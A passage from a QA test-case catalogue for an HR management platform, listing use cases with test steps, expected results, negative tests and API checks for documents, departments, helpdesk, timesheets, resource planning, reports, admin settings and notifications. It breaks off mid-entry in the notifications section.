### UC-DOC-003 — Document Approval Workflow

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** Employee → HR_ADMIN
- **URL:** http://localhost:3000/documents/pending-verification
- **API Endpoint:** POST /api/v1/documents/{id}/verify
- **Preconditions:** Employee uploaded educational certificate
- **Test Steps:**
  1. HR_ADMIN sees pending documents queue; opens document; marks as VERIFIED
  2. Employee receives notification "Educational Certificate — Verified"
  3. HR_ADMIN rejects another document with reason "Blurry — please re-upload"
- **Expected Result:** Verification status updated; employee notified; document list shows
  VERIFIED/REJECTED badge
- **Negative Test:** Peer employee views another employee's private document → HTTP 403
- **Verification:** `GET /api/v1/documents/{id}` →
  `verificationStatus: VERIFIED, verifiedBy: HR_ADMIN_ID`

### UC-DOC-004 — Document Access Control

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Various
- **URL:** http://localhost:3000/employees/{id}/documents
- **API Endpoint:** GET /api/v1/employees/{id}/documents
- **Test Steps:**
  1. HR_ADMIN can see all documents for any employee
  2. MANAGER can see team member's approved documents (not private/sensitive)
  3. Employee can see only their own documents
  4. Peer employee cannot access other's document list
- **Expected Result:** Correct access levels enforced per role
- **Negative Test:** MANAGER tries to access payslip document of non-team member → HTTP 403
- **Verification:** Each role's API response filtered correctly; audit log entries for each access

### UC-DOC-005 — E-Signature Integration

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN → Employee
- **URL:** http://localhost:3000/documents/{id}/sign
- **API Endpoint:** POST /api/v1/documents/{id}/send-for-signature
- **Test Steps:** [SKIP-IF-NO-CREDS]
  1. HR sends NDA for e-signature via DocuSign
  2. Employee receives email with signing link; signs digitally
  3. Signed PDF stored back in Google Drive
- **Expected Result:** Signature captured; document status = SIGNED; both parties receive signed
  copy
- **Negative Test:** Send for signature to email not in system → "Recipient not found in employee
  directory"
- **Verification:** `GET /api/v1/documents/{id}` → `signatureStatus: COMPLETED, signedAt: non-null`

---

## Departments — Expanded Use Cases

### UC-DEPT-002 — Department Manager Assignment

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/departments/{id}
- **API Endpoint:** PUT /api/v1/departments/{id}
- **Test Steps:**
  1. Edit department; assign new manager from employee picker
  2. Previous manager reverts to regular MANAGER role (no DEPT_HEAD scope)
  3. New manager sees department-level permissions
- **Expected Result:** Manager change reflected; new manager gets dept_head scope; org chart updated
- **Negative Test:** Assign employee from different department as department head → confirmation
  warning shown
- **Verification:** `GET /api/v1/departments/{id}` → `managerId: new_manager_id`; RBAC effective
  immediately

### UC-DEPT-003 — Employee Transfer Between Departments

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/transfer
- **API Endpoint:** POST /api/v1/employees/{id}/transfer
- **Test Steps:**
  1. Initiate transfer: Engineering → Product; effective date = next Monday
  2. Both department managers notified; headcount updated
  3. Employee's sidebar shows updated department; leave balance carried over
- **Expected Result:** Transfer recorded with effective date; old dept headcount -1; new dept +1;
  manager changes
- **Negative Test:** Transfer to same department → "Employee already in this department"
- **Verification:** `GET /api/v1/employees/{id}` →
  `departmentId: new_dept_id, transferHistory: [{...}]`

### UC-DEPT-004 — Sub-Department Creation

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/departments/new
- **API Endpoint:** POST /api/v1/departments
- **Test Steps:**
  1. Create "Frontend" as sub-department under "Engineering"
  2. Create "Backend" sub-department under "Engineering"
  3. Verify parent-child relationship in org chart
- **Expected Result:** Sub-departments appear nested under parent; headcount rolls up to parent
- **Negative Test:** Create circular parent (Engineering's parent = Engineering) → "Circular
  department hierarchy not allowed"
- **Verification:** `GET /api/v1/departments/tree` shows correct nested structure

### UC-DEPT-005 — Cost Center Mapping

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/departments/{id}/cost-center
- **API Endpoint:** PUT /api/v1/departments/{id}
- **Test Steps:**
  1. Assign cost center code "CC-ENG-001" to Engineering department
  2. Payroll run generates department-wise cost report using cost center codes
- **Expected Result:** Cost center code appears in payroll reports; expense reports tagged with cost
  center
- **Negative Test:** Duplicate cost center code → "Cost center code already assigned to another
  department"
- **Verification:** `GET /api/v1/reports/payroll/by-cost-center` groups correctly by assigned codes

### UC-DEPT-006 — Department Headcount Report

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, TENANT_ADMIN
- **URL:** http://localhost:3000/reports/headcount
- **API Endpoint:** GET /api/v1/reports/headcount
- **Test Steps:**
  1. View headcount report: department, active employees, open positions, attrition rate
  2. Drill down into Engineering: see sub-departments, team leads, average tenure
  3. Export as Excel
- **Expected Result:** Accurate headcount per department; sub-department rollup correct; attrition =
  leavers/headcount × 100
- **Negative Test:** HR_MANAGER views headcount for department they don't manage → filtered to own
  dept only
- **Verification:** Headcount totals match employee count per department in DB

---

## Helpdesk — Expanded Use Cases

### UC-HELP-002 — Ticket Category and Priority Assignment

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee → HR_ADMIN
- **URL:** http://localhost:3000/helpdesk/new
- **API Endpoint:** POST /api/v1/helpdesk/tickets
- **Playwright Spec:** `frontend/e2e/helpdesk.spec.ts`
- **Test Steps:**
  1. Employee submits ticket: Category "Payroll Discrepancy"; Priority = HIGH; description with
     details
  2. System auto-routes to Payroll team queue based on category
  3. HR_ADMIN acknowledges within SLA window
- **Expected Result:** Ticket created with correct category/priority; auto-assigned to right team;
  SLA timer starts
- **Negative Test:** Submit ticket with empty description → "Description is required (minimum 20
  characters)"
- **Verification:** `GET /api/v1/helpdesk/tickets/{id}` →
  `category: PAYROLL, priority: HIGH, assignedTeam: PAYROLL_TEAM`

### UC-HELP-003 — SLA Configuration and Breach Alert

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/helpdesk/sla
- **API Endpoint:** POST /api/v1/helpdesk/sla-configs
- **Test Steps:**
  1. Configure SLA: HIGH priority = 4h first response, 24h resolution; MEDIUM = 8h/48h
  2. Trigger HIGH priority ticket; wait for SLA breach (or advance system clock for test)
  3. Escalation notification sent to HR_ADMIN
- **Expected Result:** SLA timers enforced; breach alerts sent before and at deadline
- **Negative Test:** Set SLA resolution time < first response time → "Resolution SLA must be >=
  first response SLA"
- **Verification:** `GET /api/v1/helpdesk/tickets/{id}` → `slaBreached: true, breachTime: timestamp`
  after deadline passes

### UC-HELP-004 — Ticket Escalation

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN → HR_MANAGER
- **URL:** http://localhost:3000/helpdesk/tickets/{id}
- **API Endpoint:** POST /api/v1/helpdesk/tickets/{id}/escalate
- **Test Steps:**
  1. Ticket unresolved after 48h; auto-escalation to HR_MANAGER
  2. HR_MANAGER receives escalation notification with full ticket history
  3. HR_MANAGER resolves; escalation chain documented
- **Expected Result:** Escalation captured in ticket history; HR_MANAGER notified; original assignee
  CC'd
- **Negative Test:** Manual escalation of already-closed ticket → "Cannot escalate closed ticket"
- **Verification:** `GET /api/v1/helpdesk/tickets/{id}/history` shows ESCALATED event

### UC-HELP-005 — Knowledge Base Article

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/helpdesk/knowledge-base
- **API Endpoint:** POST /api/v1/helpdesk/kb-articles
- **Test Steps:**
  1. Create KB article "How to apply for work-from-home" with Tiptap rich text; tag with "WFH", "
     Leave"
  2. Employee searches "WFH" in helpdesk; KB article surfaces as suggested solution
  3. Employee marks article as helpful; view count incremented
- **Expected Result:** Article indexed and searchable; suggested to matching tickets; helpfulness
  tracked
- **Negative Test:** Non-HR employee creates KB article → HTTP 403
- **Verification:** `GET /api/v1/helpdesk/kb-articles?tag=WFH` returns article; `viewCount > 0`
  after employee read

### UC-HELP-006 — Ticket Closure and Satisfaction Rating

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee → HR_ADMIN
- **URL:** http://localhost:3000/helpdesk/tickets/{id}
- **API Endpoint:** POST /api/v1/helpdesk/tickets/{id}/rate
- **Test Steps:**
  1. HR_ADMIN resolves ticket; employee receives "Rate your experience" prompt
  2. Employee rates 4/5 with comment "Resolved quickly but explanation was brief"
  3. Rating aggregated to HR team satisfaction dashboard
- **Expected Result:** Rating stored; HR notified of low ratings (<3); monthly satisfaction report
  updated
- **Negative Test:** Employee rates ticket they didn't submit → HTTP 403
- **Verification:** `GET /api/v1/helpdesk/tickets/{id}` →
  `rating: 4, ratingComment: "Resolved quickly..."`

### UC-HELP-007 — Helpdesk Analytics Dashboard

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/helpdesk/analytics
- **API Endpoint:** GET /api/v1/helpdesk/analytics
- **Test Steps:**
  1. View metrics: open tickets, avg resolution time, SLA compliance %, satisfaction score
  2. Filter by department; compare month-over-month
  3. Identify top 3 categories by volume
- **Expected Result:** Accurate ticket metrics; department breakdown correct; trend chart rendered
- **Negative Test:** Employee accesses analytics dashboard → HTTP 403
- **Verification:** `GET /api/v1/helpdesk/analytics?period=monthly` matches aggregated ticket data
  in DB

---

## Timesheets — Expanded Use Cases

### UC-TIME-002 — Weekly Timesheet Submission

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/timesheets
- **API Endpoint:** POST /api/v1/timesheets
- **Playwright Spec:** `frontend/e2e/timesheets.spec.ts`
- **Test Steps:**
  1. Navigate to current week timesheet; fill in project + task for each day (Mon–Fri)
  2. Total hours = 40; click Submit
  3. Manager receives approval notification
- **Expected Result:** Timesheet submitted; status = PENDING_APPROVAL; manager notified
- **Negative Test:** Submit timesheet with total < 40h for full work week without explanation →
  warning "Hours are below expected 40h for this week"
- **Verification:** `GET /api/v1/timesheets?week=current` →
  `status: PENDING_APPROVAL, totalHours: 40`

### UC-TIME-003 — Timesheet Approval by Manager

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Manager
- **URL:** http://localhost:3000/approvals/timesheets
- **API Endpoint:** POST /api/v1/approvals/{id}/approve
- **Test Steps:**
  1. Manager views pending timesheets for team; reviews each entry
  2. Approves 3 timesheets; rejects 1 with note "Missing project code for Thursday"
- **Expected Result:** Approved timesheets locked for editing; rejected ones returned to employee
- **Negative Test:** Manager approves timesheet for employee outside their team → HTTP 403
- **Verification:** `GET /api/v1/timesheets/{id}` → `status: APPROVED, approvedBy: manager_id`

### UC-TIME-004 — Billable vs Non-Billable Tracking

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/timesheets
- **API Endpoint:** POST /api/v1/timesheets
- **Test Steps:**
  1. Fill timesheet: Client A project (8h, billable), Internal training (2h, non-billable)
  2. Verify billable hours appear in client billing report
  3. Non-billable hours excluded from billing but included in utilization
- **Expected Result:** Billable/non-billable correctly segregated; utilization rate = total hours /
  8h/day
- **Negative Test:** Submit all hours as non-billable for client project → "Project XYZ requires
  billable hours"
- **Verification:** `GET /api/v1/reports/billing?project={id}` shows only billable hours

### UC-TIME-005 — Timesheet Rejection and Correction

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee ↔ Manager
- **URL:** http://localhost:3000/timesheets
- **API Endpoint:** POST /api/v1/timesheets/{id}/resubmit
- **Test Steps:**
  1. Manager rejects timesheet with comment; employee notified
  2. Employee edits rejected timesheet (only rejected entries); resubmits
  3. Manager approves corrected version
- **Expected Result:** Rejection reason visible; only rejected entries editable; resubmission
  creates new review task
- **Negative Test:** Employee edits approved timesheet entry → "Approved timesheets cannot be
  modified"
- **Verification:** `GET /api/v1/timesheets/{id}/history` shows REJECTED → RESUBMITTED → APPROVED

### UC-TIME-006 — Project Utilization Report

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, Project Manager
- **URL:** http://localhost:3000/reports/timesheets
- **API Endpoint:** GET /api/v1/reports/timesheets/by-project
- **Test Steps:**
  1. Generate report: Project ABC; date range last month; break down by employee
  2. Total hours per employee; billable vs total; daily distribution chart
- **Expected Result:** Accurate hours per project per employee; utilization % calculated correctly
- **Negative Test:** Filter by project with no timesheet entries → empty state "No timesheet data
  for this project in the selected period"
- **Verification:** Sum of all employee hours = project total hours in report

---

## Resources (Resource Planning) — Expanded Use Cases

### UC-RESOURCE-002 — Resource Capacity Planning

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_MANAGER, Project Manager
- **URL:** http://localhost:3000/resources/planning
- **API Endpoint:** GET /api/v1/resources/capacity
- **Playwright Spec:** `frontend/e2e/resource-project-extended.spec.ts`
- **Test Steps:**
  1. View capacity planning grid: employees × time slots (weeks)
  2. See available capacity (hours per week) vs already allocated
  3. Identify 3 engineers with >20h/week available in Q2
- **Expected Result:** Capacity grid rendered; allocation vs availability clearly shown;
  over-allocation highlighted in red
- **Negative Test:** Plan capacity for inactive employee → employee excluded from grid
- **Verification:** `GET /api/v1/resources/capacity?period=Q2` returns correct available hours

### UC-RESOURCE-003 — Allocation Conflict Detection

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Project Manager
- **URL:** http://localhost:3000/resources/allocations/new
- **API Endpoint:** POST /api/v1/resources/allocations
- **Test Steps:**
  1. Allocate Employee A to Project X: 40h/week starting Monday
  2. Attempt to allocate same Employee A to Project Y: 30h/week same dates
  3. System detects conflict: total = 70h > 40h/week capacity
- **Expected Result:** Conflict detected; warning shown with current allocations; option to reduce
  allocation or pick different dates
- **Negative Test:** Allocate resource during approved leave period → "Employee is on approved leave
  during selected dates"
- **Verification:** `GET /api/v1/resources/allocations?employeeId={id}&date=conflicting_date` shows
  both conflicting allocations

### UC-RESOURCE-004 — Resource Availability Calendar

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** Project Manager
- **URL:** http://localhost:3000/resources/calendar
- **API Endpoint:** GET /api/v1/resources/availability
- **Test Steps:**
  1. View team calendar: see leave, holidays, project allocations, available slots
  2. Click on employee to see detailed availability next 4 weeks
  3. Filter by skill set "React" to find available frontend engineers
- **Expected Result:** Calendar shows accurate availability accounting for leaves, holidays, and
  existing allocations
- **Negative Test:** View availability for future date beyond 6 months → "Planning horizon is
  limited to 6 months"
- **Verification:** Available hours = (total working hours − leave hours − allocation hours) for
  each day

### UC-RESOURCE-005 — Workload Report

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports/workload
- **API Endpoint:** GET /api/v1/reports/workload
- **Test Steps:**
  1. Generate workload report for engineering team last quarter
  2. See utilization per employee: total allocated vs capacity; over-allocation flags
  3. Identify burnout risk (>90% utilization consistently)
- **Expected Result:** Report shows utilization %; over-allocated employees highlighted; trend over
  time shown
- **Negative Test:** Employee accesses workload report for other employees → scoped to own data only
- **Verification:** Utilization % = allocated hours / capacity hours × 100; matches timesheet data

### UC-RESOURCE-006 — Resource Pool Management

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/resources/pools
- **API Endpoint:** POST /api/v1/resources/pools
- **Test Steps:**
  1. Create pool "Frontend Engineers"; add 5 employees with React/TypeScript skills
  2. Project Manager requests 2 engineers from pool for 3 months
  3. HR_ADMIN approves pool allocation
- **Expected Result:** Pool visible to project managers; allocation requests tracked; availability
  updated
- **Negative Test:** Add employee already in another pool (exclusive assignment) → "Employee is in
  exclusive pool XYZ"
- **Verification:** `GET /api/v1/resources/pools/{id}/members` returns current pool members

### UC-RESOURCE-007 — Resource Allocation Approval

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Project Manager → HR_ADMIN
- **URL:** http://localhost:3000/resources/allocations
- **API Endpoint:** POST /api/v1/resources/allocations
- **Test Steps:**
  1. Project Manager requests to allocate Employee A for 3 months
  2. HR_ADMIN reviews and approves (or rejects with alternate suggestion)
  3. Employee notified of project assignment
- **Expected Result:** Allocation pending approval; HR decision captured; employee informed
- **Negative Test:** Allocate at 120% capacity without override → "Allocation exceeds employee
  capacity — HR override required"
- **Verification:** `GET /api/v1/resources/allocations/{id}` →
  `status: APPROVED, approvedBy: HR_ADMIN_ID`

---

## Reports — Expanded Use Cases

### UC-REPORT-003 — Attrition Report

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, TENANT_ADMIN
- **URL:** http://localhost:3000/reports/attrition
- **API Endpoint:** GET /api/v1/reports/attrition
- **Playwright Spec:** `frontend/e2e/reports.spec.ts`
- **Test Steps:**
  1. Generate attrition report: last 12 months; break by department, exit reason, tenure band
  2. Attrition rate = (leavers / avg headcount) × 100
  3. Compare voluntary vs involuntary attrition
- **Expected Result:** Accurate attrition %; department breakdown correct; trend chart shows monthly
  attrition
- **Negative Test:** HR_MANAGER generates attrition report for departments they don't manage → data
  scoped to own department
- **Verification:** Leavers count matches offboarded employees in DB for the period

### UC-REPORT-004 — Leave Utilization Report

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports/leave-utilization
- **API Endpoint:** GET /api/v1/reports/leave/utilization
- **Test Steps:**
  1. Generate leave utilization for current year; filter by leave type
  2. See % of entitled days used per employee; highlight employees with >80% or <20% utilization
  3. Department-wise leave trend chart
- **Expected Result:** Utilization = used days / entitled days × 100; outliers flagged; export works
- **Negative Test:** Generate report for future year → "Future period reports not available"
- **Verification:** Utilization rates match actual leave records in DB

### UC-REPORT-005 — Payroll Summary Report

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, TENANT_ADMIN
- **URL:** http://localhost:3000/reports/payroll
- **API Endpoint:** GET /api/v1/reports/payroll/summary
- **Test Steps:**
  1. Generate payroll summary for last month; see total cost, department breakdown
  2. Gross wages, employer PF contribution, ESI, PT totals
  3. Compare with previous month — variance highlighted
- **Expected Result:** All payroll components totalled correctly; variance vs prior month shown
- **Negative Test:** Generate payroll summary for month not yet processed → "Payroll not run for
  this period"
- **Verification:** Summary total = sum of all payslip gross amounts for the month

### UC-REPORT-006 — Custom Report Builder

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports/builder
- **API Endpoint:** POST /api/v1/reports/custom
- **Test Steps:**
  1. Build report: select entity "Employee"; columns = name, department, designation, join date,
     salary
  2. Add filter: department = Engineering; sort by join date ascending
  3. Save as "Engineering Team Report"; schedule monthly email
- **Expected Result:** Report generated with selected columns and filters; saved for reuse;
  scheduling works
- **Negative Test:** Select 0 columns → "At least one column is required"
- **Verification:** `GET /api/v1/reports/custom/{id}` returns saved report config; generated data
  matches filter criteria

### UC-REPORT-007 — Report Export (Excel/PDF)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports
- **API Endpoint:** GET /api/v1/reports/{type}/export
- **Test Steps:**
  1. Generate any report; click "Export Excel" — download .xlsx
  2. Click "Export PDF" — download .pdf
  3. Verify Excel: headers, data, totals row; PDF: formatted layout, page numbers
- **Expected Result:** Excel uses Apache POI; PDF uses OpenPDF; both contain accurate data; rate
  limit: 5 exports per 5 min
- **Negative Test:** Trigger 6th export in 5 minutes → HTTP 429 "Export rate limit exceeded"
- **Verification:** Downloaded file not empty; row count matches report preview count

### UC-REPORT-008 — Scheduled Report Delivery

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports/schedules
- **API Endpoint:** POST /api/v1/reports/schedules
- **Test Steps:**
  1. Schedule "Monthly Payroll Summary" to run on 1st of each month at 9 AM
  2. Configure recipients: TENANT_ADMIN + HR_ADMIN emails
  3. Trigger manually to verify delivery
- **Expected Result:** Report generated and emailed on schedule; email contains Excel attachment
- **Negative Test:** Schedule report for past date → "Schedule must be in the future"
- **Verification:** `GET /api/v1/reports/schedules` shows active schedule; email delivery logged

### UC-REPORT-009 — Performance Report

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports/performance
- **API Endpoint:** GET /api/v1/reports/performance
- **Test Steps:**
  1. Generate performance report for last review cycle; all employees scored
  2. Distribution: Exceeds Expectations (15%), Meets (60%), Below (25%)
  3. Department comparison chart; score vs tenure correlation
- **Expected Result:** Accurate score distribution; department comparison; no employee's data
  visible to peer
- **Negative Test:** Manager generates performance report for other teams → scoped to own team only
- **Verification:** Distribution percentages sum to 100%; individual scores match review records

### UC-REPORT-010 — Resource Utilization Report

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports/resource-utilization
- **API Endpoint:** GET /api/v1/reports/resource-utilization
- **Test Steps:**
  1. Generate resource utilization last quarter: allocated hours vs capacity
  2. Team-wise utilization heatmap; identify under-utilized and over-utilized
  3. Billable utilization separately shown
- **Expected Result:** Utilization = allocated / capacity × 100; heatmap rendered; billable vs total
  both shown
- **Negative Test:** Filter by non-existent project → "No data for this project in selected period"
- **Verification:** Utilization percentages match timesheet data in DB

---

## Admin & Settings — Expanded Use Cases

### UC-ADMIN-003 — Custom Field Definition

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/custom-fields
- **API Endpoint:** POST /api/v1/custom-fields
- **Playwright Spec:** `frontend/e2e/admin-system.spec.ts`
- **Test Steps:**
  1. Create custom field "Blood Group" for Employee entity; type = SELECT; options = A+, A-, B+, B-,
     O+, O-, AB+, AB-
  2. Create "T-Shirt Size" field; type = SELECT; optional
  3. Create "Employee ID Badge No." field; type = TEXT; required; unique
- **Expected Result:** Fields appear in employee profile form; validations applied; data stored in
  custom_field_values table
- **Negative Test:** Create field with duplicate name for same entity → "Field name already exists
  for Employee"
- **Verification:** `GET /api/v1/custom-fields?entity=EMPLOYEE` returns both new fields; employee
  form shows them

### UC-ADMIN-004 — Custom Field Data Capture

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/profile
- **API Endpoint:** PUT /api/v1/employees/{id}/custom-fields
- **Test Steps:**
  1. Open employee profile; fill in "Blood Group" = O+; "T-Shirt Size" = M
  2. Save; verify values persisted
  3. Edit to change blood group; verify update logged
- **Expected Result:** Custom field values saved; searchable via employee directory filter
- **Negative Test:** Leave required custom field empty on save → "Employee ID Badge No. is required"
- **Verification:** `GET /api/v1/employees/{id}/custom-fields` returns
  `[{fieldName: "Blood Group", value: "O+"}]`

### UC-ADMIN-005 — Role Implicit Permissions (No Permission = Default Deny)

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/payroll
- **API Endpoint:** GET /api/v1/payroll/runs
- **Test Steps:**
  1. Log in as Employee role; attempt to navigate to /payroll
  2. Sidebar should NOT show Payroll link
  3. Direct URL /payroll → redirect to "Access Denied" page
  4. API call `GET /api/v1/payroll/runs` → HTTP 403
- **Expected Result:** No permission = access denied at UI and API; no data leakage
- **Negative Test:** N/A — this IS the negative test
- **Verification:** HTTP 403 from API; no payroll data in network tab; no sidebar link visible

### UC-ADMIN-006 — Office Location Configuration

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/locations
- **API Endpoint:** POST /api/v1/office-locations
- **Test Steps:**
  1. Create office location "Hyderabad HQ" with address, timezone "Asia/Kolkata", geo-fence radius
     100m
  2. Assign holiday calendar "Telangana Public Holidays" to this location
  3. Employees at this location have location-specific holidays
- **Expected Result:** Location created; timezone-aware scheduling applies; location-specific
  holidays shown
- **Negative Test:** Create location with invalid timezone → "Invalid timezone identifier"
- **Verification:** `GET /api/v1/office-locations/{id}` returns location with timezone and assigned
  calendar

### UC-ADMIN-007 — Organization Settings

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** TENANT_ADMIN
- **URL:** http://localhost:3000/settings/organization
- **API Endpoint:** PUT /api/v1/settings/organization
- **Test Steps:**
  1. Update company name, logo, fiscal year (April–March vs Jan–Dec)
  2. Set working hours: 9 AM–6 PM IST; working days Mon–Fri
  3. Configure timezone for the org; verify affects leave accrual calculations
- **Expected Result:** Org settings saved; fiscal year affects payroll period labels; working hours
  affect overtime calculations
- **Negative Test:** TENANT_ADMIN sets working hours <4h/day → "Minimum working hours per day is 4"
- **Verification:** `GET /api/v1/settings/organization` returns updated settings; changes
  immediately reflected

### UC-ADMIN-008 — SAML SSO Configuration

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** TENANT_ADMIN
- **URL:** http://localhost:3000/settings/security/sso
- **API Endpoint:** POST /api/v1/settings/sso
- **Test Steps:** [SKIP-IF-NO-CREDS]
  1. Configure SAML 2.0 IDP metadata URL; set entity ID; configure attribute mapping
  2. Test SAML connection; verify SP-initiated SSO works
  3. Disable SSO; verify regular login still works
- **Expected Result:** SAML login flows correctly; attribute mapping creates/updates user profile
- **Negative Test:** Upload invalid SAML metadata XML → "Invalid SAML metadata format"
- **Verification:** `GET /api/v1/settings/sso` returns current SAML configuration status

### UC-ADMIN-009 — Restricted Holiday Configuration

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/holidays
- **API Endpoint:** POST /api/v1/holidays
- **Test Steps:**
  1. Add restricted holiday "Diwali" (optional — employee can choose to avail)
  2. Employee selects Diwali from restricted holiday quota (e.g., 2 restricted per year)
  3. Verify deducted from restricted holiday balance, not casual leave
- **Expected Result:** Restricted holiday quota tracked separately; employee chooses from list;
  balance decremented
- **Negative Test:** Employee applies for 3rd restricted holiday with only 2 quota → "Restricted
  holiday quota exhausted"
- **Verification:** `GET /api/v1/leave-balances?type=RESTRICTED` reflects correct remaining quota

### UC-ADMIN-010 — Leave Type Accrual Configuration

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/leave-types
- **API Endpoint:** PUT /api/v1/leave-types/{id}
- **Test Steps:**
  1. Configure Earned Leave: 1.5 days/month accrual; max carry-forward = 30 days
  2. Configure Casual Leave: no accrual (full 12 upfront Jan 1); no carry-forward
  3. Run monthly accrual job; verify Earned Leave balances increase by 1.5
- **Expected Result:** Accrual rules applied correctly; carry-forward enforced at year-end; balances
  accurate
- **Negative Test:** Set max accrual > total annual entitlement → "Max accrual cannot exceed annual
  entitlement"
- **Verification:** `GET /api/v1/leave-balances?type=EARNED&employeeId={id}` shows 1.5 increase
  after job run

### UC-ADMIN-011 — Payroll Settings

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/payroll
- **API Endpoint:** PUT /api/v1/settings/payroll
- **Test Steps:**
  1. Configure payroll cycle: monthly on 28th; salary hold for LOP threshold
  2. Set PF: employer contribution 12%, employee 12%; PF ceiling ₹15,000
  3. Configure ESI: 0.75% employee, 3.25% employer; ceiling ₹21,000 gross
- **Expected Result:** Settings applied in next payroll run; components calculated with correct
  rates
- **Negative Test:** Set PF rate > 20% → "PF contribution rate cannot exceed 20% per EPFO
  regulations"
- **Verification:** Next payroll run uses new settings; `GET /api/v1/settings/payroll` returns
  updated values

### UC-ADMIN-012 — Audit Log Access

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** TENANT_ADMIN, HR_ADMIN
- **URL:** http://localhost:3000/settings/audit-log
- **API Endpoint:** GET /api/v1/audit-logs
- **Test Steps:**
  1. Filter audit log: entity = Employee; action = UPDATE; date range last 7 days
  2. See what fields changed, who changed, when, from what IP
  3. Export audit log as CSV for compliance
- **Expected Result:** All CRUD operations logged; field-level change tracking; immutable records
- **Negative Test:** Employee accesses audit log → HTTP 403; no audit log link in sidebar
- **Verification:** `GET /api/v1/audit-logs?entity=EMPLOYEE&action=UPDATE` returns entries with
  before/after values

---

## Notifications — Expanded Use Cases

### UC-NOTIF-002 — Email Notification Delivery

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** HR_ADMIN → Employee
- **URL:** N/A (background job)
- **API Endpoint:** N/A (Kafka topic: nu-aura.notifications)
- **Playwright Spec:** `frontend/e2e/notifications.spec.ts`
- **Test Steps:**
  1. Approve leave request; verify employee receives email notification within 2 minutes
  2. Email subject, body, and recipient correctly rendered from template
  3. Check notification in NU-AURA bell icon — matches email content
- **Expected Result:** Email delivered; in-app notification created; no duplicate sends
- **Negative Test:** Employee with invalid email → delivery failure logged; in-app notification
  still created
- **Verification:** Check notification log: `GET /api/v1/notifications?userId={id}&channel=EMAIL`;
  confirm delivery status

### UC-NOTIF-003 — Notification Preference Management

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/settings/notifications
- **API Endpoint:** PUT /api/v1/notification-preferences
- **Test Steps:**
  1. Disable email notifications for "Leave Status Update"
  2. Keep in-app notification enabled for same type
  3. Trigger leave status change; verify email NOT sent; in-app notification created
- **Expected Result:** Preferences honored per channel per notification type
- **Negative Test:** Disable ALL notifications (mandatory types blocked) → system-critical
  notifications (password reset) always delivered
- **Verification:** `GET /api/v1/notification-preferences` reflects saved settings; email log shows
  no entry after preference disabled

### UC-NOTIF-004 — Mark Notifications as Read

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000(bell icon)
- **API Endpoint:** PUT /api/v1/notifications/mark-read
- **Test Steps:**
